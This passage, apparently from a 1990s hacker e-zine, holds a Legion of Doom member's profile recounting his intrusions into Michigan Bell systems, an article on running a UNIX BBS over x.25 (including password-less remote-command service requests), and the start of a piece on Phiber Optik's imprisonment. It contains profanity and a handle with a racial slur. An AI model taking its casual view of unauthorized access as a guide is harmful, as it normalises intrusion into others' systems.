Apple?  Everyone was!

IBM XT
------
This was a real step up from CP/M (hahaha).  I had incredible CGA
Graphics. Actually it was not a bad system.  My dad got a modem
with it.  Bad mistake eh?  I was flying at 300 baud.  This is the
system all my BBSes were run on.

AT&amp;T 3B1
--------
Lame, Lame, Lame...  That about covers it.

Commodore AMIGA 500
--------------------
A real computer at last.  Real graphics.  Real Sound.  Real
Multi-Tasking. A Real Operating System.  And again...I was a
\/\/ArEz D00D.  But this time I was running 14.4K Baud. If you
want a real computer BUY AMIGA!!!


IBM 486DX2/66

Desk Top Video is really cool.  But when you put you computers in
the car people steal them and AAA Insurance gives you a hard
time.  Still fighting with them.

Commodore AMIGA 3000
--------------------
I&#039;m a \/\/arez Dood.  And the KING of Desk Top Video.  BUT don&#039;t
put all your computers in the same car.  Oops...

Commodore AMIGA 500
-------------------
Now I&#039;m back to a 500 Until I get my Insurance company to pay me.

General Questions:

Q: How did you get your Handle?

A: If you cant figure this out...you should not be reading this.

Q: How did you get started?

A: Dad bought me an IBM XT with a 300 Baud Modem.  I saw War
   Games...and off I went.

Q: What are some of your other interests?

A: Women... Women... Women... Everybody knows about my high
   level of hormonal activity.  Also, Cars.  If you don&#039;t have a
   Mitusubishi 3000GT:  U R Lame.  If you have a Stealth, I bet you
   wish you bought a 3000GT--after you have dealt with the FUCKING
   ASSHOLES at the Chrysler DealerShit.   Everybody says buy
   American.  Well, you buy a FUCKING brand new American car and it
   brakes down 32 times.  The Chrysler dealer treats you like shit.
   The manufacturer treats you like shit.  And your car runs like
   shit.  The problem is that the American auto workers have
   absolutely no pride in their workmanship; and the manufacturers
   and dealers don&#039;t give a shit about you or your car after they
   have made the sale.  Then they wonder why their sales are down
   and people are buying foreign cars.  Well, if I go into the
   Mitusubishi Dealership they treat me like a king and I bought the
   car 6 months ago.  If your gonna by a car, don&#039;t buy a Chrysler.
   They Suck!  I bought a brand new Jeep.  It broke down 32 Times.
   Chrysler treated me like shit.  Maybe you could tell.

Q: What were some of your most memorable experiences?

A: The First SummerCon.  Disk Jockey and LOKI came to my house
   the day before.  This is the first time we had met.  On the way
   to my house they got lost and came across a street called
   &#039;Summerton.&#039;  So at about 0200 in the morning we were on the corner
   of Summerton Street and all the sudden the Summerton sign fell of
   the post and landed in the car owned by Disk Jockey.  Well we
   changed the T to a C and all the suddenly we had a SummerCon
   street sign.

   The trip down was a story in it self,  as many of you have
   heard. It was really neat to meet all the people from the
   boards.  I met Bill From RNOC who was my mentor and idol, but doesn&#039;t
   call me anymore.. (Thanks Bill).  Lex Luthor who is one of the
   funniest guys, we will get into this later.  Taran King, Knight
   Lightning (Scoop!), Lucifer 666...it was ELITE!

   SummerCon 87&#039; -  This is when I got it LOD/H.  I remember sitting
   at the pool with Mentor being really drunk and both of us going
   &quot;WOW!!! We&#039;re in LOD!&quot;

   My Bust -  In 1987 I was going to school in Chicago.  I was on an
   Michigan Bell UNIX sharpening up my C programming skills, which,
   buy the way still need sharpening.  I was on the system for 4+
   hours.  Well the system administrator had noticed me and called
   MBT security.  They traced the call back to Chicago.  The strange
   part of this was that the next morning I was quitting school and
   moving back to Detroit.  When I got home to Detroit their was a
   message from MBT Security to call them or they would &quot;Call On
   Me!&quot;.  Well I thought it would be in my best interest to give
   them a ring.   We met for lunch.

   At lunch they told me since I had been in their systems for years
   and not destroyed or changed anything...in fact they had never
   noticed me there...They  would not press charges if I helped them
   secure there systems.  I said &quot;Ok!&quot;.

   The next thing I know I have an office.  k-Rad elite computer.
   Craft Access terminals.  Manuals for every phone company computer
   on the planet and they are paying me $30,000 a year to do what I
   love.  I was a professional Computer Hacker.  I broke into
   Michigan Bell computers, networks, switches, went trashing
   etc...while being paid.  It was great.  I would see what I could
   do once I was into their systems, then write a report on what
   needed to be changed or fixed.  I was great for them, and me.

   Then I get fired - my boss at Michigan Bell loves me!  Her boss
   loves me!  The Vice President of Michigan Bell loves me!  Then
   Michigan Bell has a retirement incentive. The Vice President and
   my bosses boss retire.  The New manager of computer security is
   closed-minded, and fires me because I am &quot;A criminal&quot;.

   Well, those guys at corporate security at Michigan Bell are
   totally out of touch. Their knowledge of computer security
   is...how shall I say it...&quot;lacking,&quot; I think, covers it.  In
   fact, the code for the front door at the Michigan Bell Corporate
   Security Building is the equivalent to leaving the code on your
   luggage 000 and wondering how the airport baggage guy figure out
   your code and stole all your stuff.   They should have kept
   me on like the old guys wanted to do.

   It is my understanding,  and I don&#039;t know because I don&#039;t do
   ANYTHING ILLEGAL (like the disclaimer?), but I hear that a lot of
   hackers are in Michigan Bell Systems.  Michigan Bell Security is
   probably convinced that their systems are airtight.  If you guys
   at Michigan Bell are reading this,  You need help..  Look through
   some of my old reports and implement some of that stuff.

Some BBS&#039;s To Mention:

Planet 10/Librarians of Doom - (810)683-9722.  I&#039;m Co-Sysop.  It
is the only BBS I call. All the Old LOD Guys are on it.  It&#039;s
pretty 3l33t.  If you can&#039;t hack the  New User Password--U R
really lame!  We got 0 day AMIGA Warez.  Running on a USR HST.
Leave a good New User Feedback message because the users on the
system read the New User Feedback and vote whether or not you
will be allowed access to the system based on that message.

ShadowSpawn BBS - Well, this was before I was in LOD.  Our claim
to fame was that we wouldn&#039;t let anyone on the BBS unless they
gave us a valid phone number.  We voice verified EVERYONE.  And
talked to them before we gave them an account.  Most of the
people from LOD were not on because they would not give a valid
phone number.  It was not my idea it was Psychic Warlord&#039;s idea.
I could not believe we turned Lex Luthor down--we got in quite a
fight about that.

Phantasy Realm - My first BBS.  I always thought It was LAME,
but people always tell me how cool it was.  I guess when you
login 15 times a day, it seems like the posting is slow.

The Coalition - I was co-sysop on this board as well.  Run by Bad
Subscript, one of my best friends.  Another board I never thought
was cool but everyone says it was great.  Guess maybe I called it
too much as well.

Metal Shop Private - I thought I was the Elite of the Elite when
I got on there.  There were guys from LOD posting and everything.
I really was a cool system.

Catch 22 - Well I think I was the last user before the system
went down.  I think I was on for about 3 days before it went off
line.  I think it was good.  As least I used it for a reference
on other BBS (That was when I was just becoming well known.)

Whacky Wally&#039;s Wonderful World Of Warez - Some of you may
remember it.  It was an H/P board that I ran for a while before
Phantasy Realm.  It was mostly done for a joke, but it ended up
being pretty cool.

----------------------------------------------------------------------

People to mention:

Erreth Akbe -  One of my best friends.  Helped me write this
profile.  Sysop of Planet 10/Librarians of Doom. The MASTER
NOVELL guy.  If you want to  know anything about NOVELL...Talk to
him.  (He&#039;s a CNE!!)  Without him you would have all sorts of
spelling errors and this profile would really look like shit.
Plus, the BBS would have crashed long ago.  He&#039;s my official
editor.

Carol - Erreth Akbe&#039;s Wife.  Love ya babe!  Got me a great deal
on my 3000GT.  I still owe you dinner!

Bad Subscript - My best friend.  What a great guy.  We hit
Industry (the coolest nightclub in Pontiac) every Tuesday night.
He&#039;s the biggest LEEEECH in the world, though.  At this point he
has 192 Downloads @ 94 Megs and 9 Uploads @ 2 Megs.  Great ratio, eh?

Lucifer 666 - What a great guy.  Still talk to him daily after
all these years.  Comes to Detroit a lot and I go to Illinois to
see him a lot. I have a great story about L666.  His family owns a
real estate company in Illinois where he lives.   Well, they sold
a house to Virgil Ramsey, a Vietnam Vet.  Well, Mr. Ramsey&#039;s new
house has termite damage.  L666 went to the house and verified
the damage.  He told Mr. Ramsey that he would call an
exterminator the next day.  Well I guess Mr. Ramsey didn&#039;t like
the exterminator idea, because the next day he went to L666&#039;s
office with a bolt-action rifle.  Took L666 outside into the
street, with the gun to his head, and told him he was going to
kill him.  L666 swung around and hit the gun barrel upwards just
as Ramsey pulled the trigger.  They fought over the gun and L666
tossed the gun into the street.  Ramsey went after the gun and
L666 ran into the real estate building and locked the back door.
Ramsey ran in the front door with gun in hand.  L666 went into
his office and locked the door.  Ramsey kicked in his office
door.  L666 was under his desk.  Ramsey said &quot;Stand Up (L666&#039;s
First Name) and take it like a Man!&quot; L666 jumped up and they
fought over the gun again.  (I was at his office and saw the
footprints on his door).  The bolt action opened and the bullet
in the chamber fell to the ground.  Ramsey put the gun to L666&#039;s
head and pulled the trigger, but the action was open.  The cops
finally came in and arrested Ramsey.  They say it is some type of
stress related to Vietnam.

Laurie (L666&#039;s Girlfriend) - She&#039;s Cool.  Hi Hoochie!  Well I
have a good story about her.  BTW If you talk to L666 ask him why
I call his girlfriend &quot;Baldie&quot;.  Anyway.  L666 and Laurie came to
Detroit in October.  The first night we went to this bar that I
always go to, called Industry.  Well Laurie was worried about the
crime in Detroit.  I had just got done telling her that nothing
ever happens Besides, we were in Pontiac!  L666, Bad Subscript,
Erreth Akbe DarkStar, Laurie and I were all in the car.  We
pulled into the Industry parking lot.  Some guy was laying on the
ground and 3 guys were kicking him.  Then they picked him up.
Through him into the back of a panel van and drove off. L666,
DarkStar and Laurie had been in Detroit for all of an hour and
this is the first thing we see when we go to the bar.  Needless
to say, she was freaking out.  The rest of the weekend went
smoothly, though--except for DarkStar and L666 flashing deuce
gang signs at Club X in Detroit.  Not a smart move.

DarkStar - Hay bud.  He&#039;s really fun.  We party together a lot
in Detroit and Illinois, but I wouldn&#039;t take him to Las Vegas
with me.  He did really shitty on the river boat we gambled on in
the Mississippi river last November.

Prime Suspect - Fellow LOD member.  One of the smartest hackers I
have ever met.  In fact PR1ME Computers call him to help program
there kernels when they can&#039;t figure it out.  No lie!  He also is
Mr. Packet Radio.  I really had fun with the cellular phone
interception.  I talk to him 3-4 times a week. He and Bad
Subscript talk more, though.  Finally after 6 or 7 years he came
to Detroit to see us last November.  We had a great time.  I&#039;m
sure he&#039;ll be back.

Bill From RNOC - Fellow LOD Member. My Mentor.  He taught me
about UNIX and Phone Company Computer and Networks.  Taught me
how to engineer.  Was a great friend.  We talked 3-4 times a day
for a yea or so.  Haven&#039;t talked to him much lately.  Hope
everything is going well for you, Bill...

Lex Luthor - Mr. LOD!  U R Out of Control!  Lex is a great guy.
There have been rumors about him floating around for years.  Let
me tell you.  They are all false.  He is the greatest guy.  At
SummerCon he was pretty mellow.  He stayed at my house for a week
or two.  He was a blast.  I have pictures of Him, Bad Subscript
and me sitting on a dumpster outside EDS, and painted on the
dumpster it says &quot;Computer Papers Only&quot;.  Also have picture of
him and I outside a funeral home with the address &quot;2600&quot; in BIG
letters.  Now he has been denying this outside in his underwear
story for years.  Here it is.  Lex stayed at my house for a few
weeks.  I hooked him up with this girl (she was HOT.. And he was
tearing it up with her every night).  Well we went to Motel Sex
(Motel 6) one night and were drinking pretty heavy.  At about
0100 in the morning he went out of his room in his underwear.
Now the doors to the rooms are outside.  And was kicking my door
yelling &quot;We need more Beer!&quot;.  I think it was blown a little out
of proportion.  I hear a story that he was running around the
parking lot or something.  But that is the story...anyway he&#039;s a
great guy.

Phantom Phreaker - Fellow LOD Member. FUN FUN FUN.  He is one of
the friendliest people I have ever meet.  He is a blast to party
with.  Love the hair!  He has good things to say about everyone.
I have never meet anyone that knows more about Switching System
and such than him.  He is a walking phone company manual.  BTW:
How&#039;s your balls? (Private Joke)

Doom Prophet - Fellow LOD Member. Phantom Phreaker&#039;s Twin Brother.
Haven&#039;t seen much of him the last few years.  Another walking
manual.  Hope you&#039;re doing good.

The Marauder - Fellow LOD Member.  I really got along great with
him.. Didn&#039;t see much of him the second night.  He and Phantom
Phreaker were hiding...but he was really a great guy!

Taran King/Knight Lightning - Got me into the &quot;Elite&quot; Scene.  I
really like you guys.  Always a lot of fun.  Don&#039;t see much of
you anymore at the SummerCons.  Train King is off with this
woman, now wife.  Congratulations.. Hope you are happy forever
And Knight Lightning is on the run from the Hotel manager who is
running around asking everyone  &quot;Are you Craig Nedordorf?&quot;.

Erik Bloodaxe - Fellow LOD Member.  We have been completely &quot;Out
of Control&quot; together. He is a blast.  We have had our
differences, and I don&#039;t really know why.  But I really like him.
He is BIG fun!  I didn&#039;t see much of you at the last SummerCon.
Hope to talk to you more in the Future!

Forest Ranger - JT.  What a great and fun guy.  In the past we
didn&#039;t hang out too much, but last year at SummerCon we really
had a great time together. What a ladies&#039; man!  Hope to see you
soon.  Give me a call...maybe you can come to Detroit with L666
and go to the Gran Prix.  I&#039;m getting us all pit passes!

The Mentor - Fellow LOD Member.  Great guy.  We got into LOD/H
together.  Haven&#039;t heard much from him lately.  Hope all is
well.

The Prophet/The UrVile/The Leftist - Fellow LOD Members.  The
three of us really got along great.  We were always together at
the SummerCons.  We talked 5000000 times a day on the phone.  I
really liked them.  They were really cool.. Then............ What
the FUCK!  The government flew them to Detroit to testify in front
of the grand jury against me.  No problem--you do what you gotta
do.  But if you&#039;re in town you could at least give me a call
after all we have been through together.  That was really weak.
And don&#039;t return my calls 3 years later... Whatever!

Dispater - All around fun guy.  Didn&#039;t go to SummerCon last year.
I know Erreth Akbe was bummed.  He was really looking forward to
seeing you.  I&#039;m not going this year, but if I *WAS*, I would
really like to see ya.

High Evolutionary - We have never met,  but in the mid 80&#039;s we
talked daily.  Haven&#039;t heard anything about him in years.  He was
really a smart guy. Hope all is well.

Psychic Warlord - Great guy.  Sysop of ShadowSpawn.  We hung
around A LOT in the old days. I understand you are getting
married.  Congratulations.  Hope I&#039;m invited.

Mitch Kapor (Programmer of LOTUS) - You know why Mitch.  I thank
you much.  If you ever need anything.  You have my phone number!

Jim F - He helped me out of a LOT of problems.. Thanks Jim!

(Please Note: These are in no special order.  If you are on the
top of the list or the bottom it has no relation to your
importance on the list.)

---------------------------------------------------------------------

What I think of the Future of the Underground:

Ahahaha.. LAME, LAME, LAME..   In the old days we were the first
to do things.  We would get on a system and play with it for
hours.  It was a quest for knowledge. That was what LOD/H was all
about. Today&#039;s new &quot;hackers&quot; are really assholes.  They don&#039;t do
it to learn.  They want to mess things up.  I really can&#039;t stand
the new anarchy thing that is going around.  We have kids logging
onto the BBS that say &quot;I have 400+ viruses&quot;.  Well.. That&#039;s not
cool.

The purpose of hacking is to learn.  Learn the way a computer
system runs.  Learn how the telephone switching systems work.
Learn how a packet switching network works.  It&#039;s not to destroy
things or make other peoples lives a mess by deleting all the
work they did for the past week.  The reason the  Department of Justice
has crackdowns on computer hackers is because so many of them are
destructive.  That&#039;s just stupid criminal behavior and I hope they
all get busted.  They shouldn&#039;t be around.  You give real
hackers a bad name.

----------------------------------------------------------------------

Other Things to Mention:

The &quot;NEW Legion of Doom&quot; -  Beyond Lame.  It is my understanding
that some lame kid from Canada (eh!) was starting a &quot;New LOD&quot;.
Well those kids couldn&#039;t hack their way into, let alone out of a
Cracker Jack box.  If they are on you BBS.. Delete them!  They
have absolutely no affiliation with the real Legion of Doom!

DrunkFux - Jessie, I have been trying to get a hold of you for a
year now.  If you could get my number and call me.  Or call our
board (810)683-9722 and leave me your phone number.  I would like
to get Dena&#039;s phone number from you.

----------------------------------------------------------------------

In the late 80&#039;s someone call forwarded my home phone to a Voice
Mail Box.. I heard it was SuperNigger, but he says not.. I
thought you guys might get a kick out of the message left on it.


     My name&#039;s Control C.. AKA Phase Jitter of LOD!

     Elite as can be...  I thought that was Me!

     Until they forwarded my number to a V.M.B.

----------------------------------------------------------------------

Well that&#039;s about it.. My final words of wisdom... Call our
board.. It&#039;s 3l33t!


Control C
Legion of Doom/Hackers

                        Running a Board on x.25
                        =======================

In this article, I want to inform the reader about advantages, problems,
experiences and fun about running a BBS on x.25.  I also want to do a few
comparisons between x.25 on one hand and the Internet and phone system
on the other.  This article may also help you to setup a BBS on a
UNIX, no matter if on x.25 or not.


I.      Systems on x.25...
==========================

In my article for Phrack 42 about the German scene (read it if you haven&#039;t
done so yet! :-)  I also mentioned the x.25 scene and a few Bulletin Board
Systems (BBS / boards) on it.

One of the most popular ones, LUTZIFER, just went down on December 20, 1993.
Lutzifer used to be one of the most popular x.25 boards back in 1990 and
early 1991, when US people were still able to use Tymnet (&quot;video&quot; and
&quot;parmaster&quot;) and Sprintnet without much of a hassle.  I spoke with Lutz
(sysop of Lutzifer) at the CCC Congress in Hamburg a week later.  He told
me that he first just wanted to change the speed for his x.25 connection
from 9600 to 2400 to save some money (actually 50%), because he didn&#039;t get
too many calls anyway.  But the German Telekom (who handle x.25 AND the phone
lines) wanted him to cancel his old x.25 connection, get a new NUA, pay the
$300 installation fee, all to get a 2400 bps connection.  This really made
Lutz mad, and he finally decided to cancel all x.25 - so goodbye to Lutzifer!

On the other side, QSD (the lamest chat system one can imagine) is still
up and running on x.25.  Back in Summer 1993, there have been many rumors
that QSD would go down.  It wasn&#039;t reachable from most networks in the world
anymore, including Sprintnet, Datex-P and others.  They were probably just
&quot;testing&quot; something - but QSD will never have its &gt;80 online users again
(sounds pretty ridiculous compared to IRC :) that it had back in the good
old days.


II.     Advantages of x.25
==========================

You may wonder what the advantages of running a board on x.25 are.
Wouldn&#039;t an Internet link or a phone dialup be enough?  In fact, the Internet
is getting more and more popular, the number of its hosts is increasing
dramatically.  This, and the fact that ISDN is faster and available to more
and more people at cheaper rates, makes x.25 seem unattractive.

But x.25 is a very old and safe network.  It hasn&#039;t really changed in 10
years.  There are hardly any netsplits like on the Internet, and it has
a very low rate of data errors.  X.25 is available in almost every country
(far over 200) in the world, even in countries that never heard of Internet
like Mauritius or United Arab Emirates.  This means that a lot of people from
all over the world can call you at a cheap rate (at least cheaper than
international phone charges, for some people even free at all :).
To the sysop it offers a couple of features that modems can&#039;t offer, and
where the Internet isn&#039;t safe enough.  This is also a reason why most banks,
insurances and credit agencies still rely on x.25.  I will describe those
features in the next chapter.


III.    Setting up your X.25 board
==================================

So let&#039;s get practical after all this boring theory!

How do you start if you want to setup your own x.25 board?

First of all, you need your own x.25 line.  In most countries your phone
company would be responsible; in a few countries like the US you may even
have a choice of different x.25 providers like &quot;Sprintnet&quot;.  The prices for
those lines really vary.  You may check the Sprintnet or Tymnet Toll Free
information service, that also gives you information and prices about
other countries.  E.g. in Germany a 2400 bps (the slowest) link would be
US$130 a month, a 9600 bps link about $260.  The good thing though is that
each additional virtual channel is just $3 more per month (in Germany).
A number of 16 channels is typical and 128 channels aren&#039;t exotic.

But remember, all channels have to share the maximum bandwidth of - let&#039;s
say - 9600 bps.  So if 10 people would start to leech the latest Phrack
at the same time, they would all just have 960 bps each or 96 cps.

But downloading isn&#039;t always that easy.  In fact, many of my users have
been reporting problems while trying to download.  While a few x.25
networks like Datapak Norway and German Datex-P are true 8 bit networks,
many networks and PADs just handle 7 bit connections.  It&#039;s not always
that easy to transfer binaries at 7 bit, though it was possible for me
to download from a Sprintnet dialup using a &#039;good&#039; version of Z-Modem.

X.25 is not the right choice if you want to transfer huge amounts of data
anyway.  It is meant for people who work interactively.  It is recommended
for people who want to do a database research, read and write email and news
or just chat.

You will also notice that, if you are a paying x.25 user (aren&#039;t you all :-)
and get your bills, connection time is really cheap; up to 70 times cheaper
than long distance phone charges.  What counts are the transmitted bytes,
no matter how fast you are!  You easily pay $30 for transferring 1 MB.

But what else do you need after you got your x.25 link?

You need a PC (which doesn&#039;t have to be fast; I was using a 386sx for quite
some time.  In fact, my new 486/40 board is &#039;too fast&#039; for my old x.25 8 bit
adaptor :).  It might also be interesting to run it on a Sun or HP
workstation; but the x.25 cards for those machines are rather expensive.

Then you need a good operating system.  Don&#039;t even think of running DOS.
You want to have a multi-user multi-tasking system after all, don&#039;t you?
So your choice is UNIX.  Systems with pretty good x.25 solutions are
Interactive and SCO Unix.  They are both old fashioned System V / 386&#039;s,
but are running safely, hardly ever crash and are popular in the commercial
world.  I chose Interactive.

How do you connect your PC to the x.25 line?

Good guess.  Yes, you need an adaptor card.  I got an EICON/PC card.  EICON
cards are probably the best supported and most common x.25 cards - they
are made in Canada.  However, they aren&#039;t cheap.  Usually they are around
$1000, if you are lucky you could get a used one for $600.  You might get
a cheaper x.25 adaptor, but check in advance if the software you want to
use supports that adaptor.  There is no real standard concerning x.25 cards!

Anything else you need?

Yes, the most important thing - the software.  UNIX doesn&#039;t come with
x.25 drivers.  However, there is a really good x.25 solution available
from netCS Software in Berlin, Germany.  (The company was co-founded
by &quot;Pengo&quot; Hans H.  Send them mail to postmaster@netcs.com for info.)


IV.     Features
================

This software, and x.25 in general, has a few nice features.  If you
receive an x.25 call from somewhere, the NUA (&quot;Network User Address&quot;)
of the caller is being transmitted to you.  This works pretty much like
Caller-ID, with the exception that the caller can&#039;t prevent it from being
transmitted, and he usually can&#039;t fake the address he is calling from.
Of course he can call through a couple of systems, and you would just
see the NUA of the last system he calls you from.

This feature can easily be used to accept or reject calls from certain
NUAs/systems or whole countries.  Many systems like banks just allow
certain NUAs to call them, just the ones that they know.

You could also give different access to different people:  people from
country A may login to your system, country B may just write you a mail,
all other countries are forced into chat and the NUA of CERT is being
rejected and received a &quot;nice&quot; goodbye message.

Of course you will also keep a logfile (and 99% of the systems you call
will have a logfile with YOUR call and the calls you might place using
its pad).  This logfile usually contains the NUA that calls you (or that
is being called), the programs that are being executed, the userid of
the caller, duration, reason for termination and more.

Another interesting feature is the &#039;Call User Data&#039; (CUD).  The caller may
transmit up to 16 bytes (default is 4 bytes) to your host before he
establishes an x.25 connection.  In these bytes he may send you a Service
Request.  The default CUD is 01/00/00/00 and means &#039;interactive login&#039;.
You may define any CUD you want and just accept calls that use that certain
CUD - it would work like a system password then.  Many systems may also
have a service request that allows the caller to execute commands on that
host remotely, without supplying any additional password (be aware of this!)

For more technical information about x.25 read one of the articles in the
previous issues of Phrack.  I am glad that Phrack is still covering x.25
with plenty of interesting articles after all these years!


IV.     Chosing the BBS Software
================================

Okay.  Now we decided to choose UNIX as operating system.  Of course, you
could give all your users shell access, create a guest account with limited
shell access and a chat account that kicks you just into chat.  That&#039;s what
I used to do first.  But since we want to run an open system and give
accounts to many hackers, it might be a scary vision that all of them
have shell access and try to hack your system.

This is the point when you are looking for a BBS software for UNIX.  There
aren&#039;t too many free BBSes for UNIX around, most of them cost some hundred
dollars (check out the latest Boardwatch issue for more information).

However, I found a pretty decent BBS software called &#039;Uniboard&#039;.  It runs
fine on most System V&#039;s including Interactive and SCO; versions for Sun OS
and Linux are available too.  It offers you a nice colorful (you may turn
it to black &amp; white) menu driven interface.  You have to have C-News and
sendmail installed and running.  Instead of sendmail I use smail, which
is bug-free, much easier to install and offers at least the same features.
C-News though isn&#039;t that easy to install and takes quite some time and
document reading.  But these packages are used by Uniboard for messages (news)
and email.  This is pretty nice, because you can just exchange mail with
everyone on the Internet.  You can also read your favorite newsgroups
in Uniboard like alt.sex.bondage and post to local groups.  The filebase
is designed okay, but it doesn&#039;t feature the concept of ratios yet.
(You just get one byte download ability for each byte you upload!).  Rick,
the author, promised me to put it into the next version though.  The biggest
drawback is that you will just get the binary, no sources available,
so you can&#039;t put in all the features you would like.  For more information
send email to the author Rick in Italy at pizzi@nervous.com.
He will give you a free demo key that works for a few weeks, if you ask him.
Afterwards you could get a key for $40 and more, depending how many users
you want to have.


V.      How to get more users
=============================

You may think:  Okay, fine.  But not everybody has x.25 access, though
(almost) everybody has Internet access.  How could these people call me?
Well, the solution isn&#039;t easy.  I was told though that someone installed
an Internet site that would forward the call through an x.25 PAD to my
system.  Of course, the system administrator of that Internet site found
out after a while and installed the following banner (he obviously has
a sense of humor :) - someone sent me this log:

Dear fellow hacker,
Please use YOUR telephone to make long distance calls
Using other&#039;s systems over the Internet is just NOT fair
let alone that is ILLEGAL.  Anyway, your hosts computer names/IP addresses
and location, as well as accurate logs of most of your recent/6 months
unauthorized calls are in file and might be used against you in court.

sorry if we ruined your day...

V.      Modem Ports
===================

Also, every board on x.25 should have a direct modem dialup (and I guess
every board does!  The dialup for Lutzifer wasn&#039;t public, but it had one!)
You need to have a modem at least for uucp polling of news and mail.
If you are running UNIX, you don&#039;t need one of those really expensive
&#039;intelligent&#039; cards like DigiBoard for $1000.  But make sure you have
a 16550 chip on your I/O controller or you won&#039;t be happy.  A pretty good
deal are AST compatible cards with 4 ports.  You can get them for $60 if
you are lucky.  They just use one IRQ for all 4 ports and let you select
the IRQ and the base addresses.  This is pretty convenient, because it
is even more likely to get an IRQ conflict under UNIX than under DOS.
Try to get a card with 16550&#039;s on it, or one that has sockets that let
you replace the old 16450&#039;s or whatever with 16550&#039;s, without playing
with your soldering iron.  If you buy 16550&#039;s, try to get the original
NS (National Semiconductor) ones: NS16550AFN; Texas Instrument&#039;s aren&#039;t
as good.

Then you should get a good serial port driver like the excellent FAS 2.10.
It is quite flexible with default drivers for AST compatible and standard
I/O cards, supports speeds up to 115,200 bps, and supports both incoming
and outgoing calls on the same line very well.  It only works with System V
though.

I can&#039;t help smiling when people tell me about their ElEeT WaR3Z boards
running on DOS and Novell with a separate PC for each node.  With the
configuration mentioned above, you can easily have 4 or 8 high speed modems
with a host speed of 57.600 connected to a single 386 PC and no performance
loss.

 No Time For Goodbyes

 Phiber Optik&#039;s Journey to Prison

 by Emmanuel Goldstein

 It was almost like looking forward to something. That&#039;s the feeling
 we all had as we started out on Thursday evening, January 6th - one
 day before Phiber Optik (hereafter called Mark) was to report to
 federal prison in Schuylkill, Pennsylvania for his undefined part
 in an undefined conspiracy. We were all hackers of one sort or
 another and this trip to a prison was actually a sort of adventure
 for us. We knew Mark&#039;s curiosity had been piqued as well, though
 not to the point of outweighing the dread of the unknown and the
 emotional drain of losing a year of life with friends, family, and
 technology.

 There were five of us who would take the trip down to Philadelphia
 in a car meant for four - myself, Mark, Walter, Roman, and Rob. The
 plan was to meet up with 2600 people in Philadelphia on Thursday,
 drive out to Schuylkill and drop Mark off on Friday, drive back and
 go to the Philadelphia 2600 meeting, and return later that evening.
 It sure sounded better than sending him away on a prison bus.

 Knocking on the door of his family&#039;s house in Queens that frigid
 night, a very weird feeling came over me. How many times had I
 stood there before to take Mark to a conference, a hacker meeting,
 a radio show, whatever. Today I was there to separate him from
 everything he knew. I felt like I had somehow become part of the
 process, that I was an agent of the government sent there to finish
 the dirty work that they had begun. It doesn&#039;t take a whole lot to
 join the gestapo, I realized.

 I talked to Mark&#039;s father for the very first time that night. I had
 chatted with his mother on a number of occasions but never his
 father before then. He was putting on as brave a front as he could,
 looking at any glimmer of optimism as the shape reality would take.
 The prison wouldn&#039;t be that bad, he would be treated like a human
 being, they&#039;d try to visit on the weekends, and anything else that
 could help make this seem like an extended vacation. As long as he
 learns to keep his mouth shut and not annoy anyone, he&#039;ll be all
 right. Of course, we both knew full well that Mark&#039;s forthright
 approach *always* managed to annoy somebody, albeit usually only
 until they got to know him a little. Imagining Mark fading into the
 background just wasn&#039;t something we could do.

 Everything in Mark&#039;s room was neatly arranged and ready to greet
 him upon his return - his computer, manuals, a videotape of &quot;Monty
 Python and the Holy Grail&quot; with extra footage that a friend had
 sent him (I convinced him to let me borrow it), a first edition of
 &quot;Hackers&quot; that Steven Levy had just given him, and tons of other
 items that could keep anyone occupied for hours. In fact, he was
 occupied when I got there - he and Walter were trying to solve a
 terminal emulation problem. My gestapo duties forced me to get him
 going. It was getting late and we had to be in Philadelphia at a
 reasonable time, especially since it was supposed to start snowing
 at any moment. And so, the final goodbyes were said - Mark&#039;s mother
 was especially worried that he might forget part of his medication
 or that they&#039;d have difficulty getting him refills. (In fact,
 everyone involved in his case couldn&#039;t understand why Mark&#039;s
 serious health problems had never been mentioned during the whole
 ordeal or considered during sentencing.) The rest of us waited in
 the car so he could have some final moments of privacy - and also
 so we wouldn&#039;t have to pretend to smile while watching a family
 being pulled apart in front of us, all in the name of sending a
 message to other hackers.

 Our drive was like almost any other. We talked about the previous
 night&#039;s radio show, argued about software, discussed nuances of
 Star Trek, and managed to get lost before we even left New York.
 (Somehow we couldn&#039;t figure out how the BQE southbound connected
 with the Verrazano Bridge which led to an extended stay in
 Brooklyn.) We talked about ECHO, the system that Mark has been
 working on over the past year and how, since Wednesday, a couple of
 dozen users had changed their last names to Optik as a tribute. It
 meant a lot to him.

 When you&#039;re in a car with five hackers, there&#039;s rarely any quiet
 moments and the time goes by pretty quickly. So we arrived in
 Philadelphia and (after getting lost again) found our way to South
 Street and Jim&#039;s Cheesesteaks, a place I had always wanted to take
 Mark to, since he has such an affinity to red meat. Jim&#039;s is one of
 my favorite places in the world and we soon became very comfortable
 there. We met up with Bernie S. and some of the other Philadelphia
 hackers and had a great time playing with laptops and scanners
 while eating cheesesteaks. The people at Jim&#039;s were fascinated by
 us and asked all kinds of questions about computers and things.
 We&#039;ve had so many gatherings like this in the past, but it was
 pretty cool to just pull into a strange city and have it happen
 again. The karma was good.

 We wound up back at Bernie S.&#039;s house where we exchanged theories
 and experiences of our various cable and phone companies, played
 around with scanners, and just tried to act like everything was as
 normal as ever. We also went to an all-night supermarket to find
 Pennsylvania things: TastyKakes, Pennsylvania Dutch pretzels, and
 pickles that we found out were really from Brooklyn. We managed to
 confuse the hell out of the bar code reader by passing a copy of
 2600 over it - the system hung for at least a minute!

 It was around five in the morning when one of us finally asked the
 question: &quot;Just when exactly does Mark have to be at this prison?&quot;
 We decided to call them right then and there to find out. The
 person answering the phone was nice enough - she said he had until
 11:59 pm before he was considered a fugitive. This was very good
 news - it meant a few more hours of freedom and Mark was happy that
 he&#039;d get to go to the Philadelphia meeting after all. As we drifted
 off to sleep with the sun rising, we tried to outdo each other with
 trivial information about foreign countries. Mark was particularly
 good with obscure African nations of years past while I was the
 only one who knew what had become of Burma. All told, not a bad
 last day.

 Prison Day arrived and we all got up at the same moment (2:03 pm)
 because Bernie S. sounded an airhorn in the living room. Crude, but
 effective.

 As we recharged ourselves, it quickly became apparent that this was
 a very bizarre day. During the overnight, the entire region had
 been paralyzed by a freak ice storm - something I hadn&#039;t seen in 16
 years and most of the rest of us had never experienced. We turned
 on the TV - interstates were closed, power was failing, cars were
 moving sideways, people were falling down.... This was definitely
 cool. But what about Mark? How could we get him to prison with
 roads closed and treacherous conditions everywhere? His prison was
 about two hours away in the direction of wilderness and mining
 towns. If the city was paralyzed, the sticks must be amputated
 entirely!

 So we called the prison again. Bernie S. did the talking, as he had
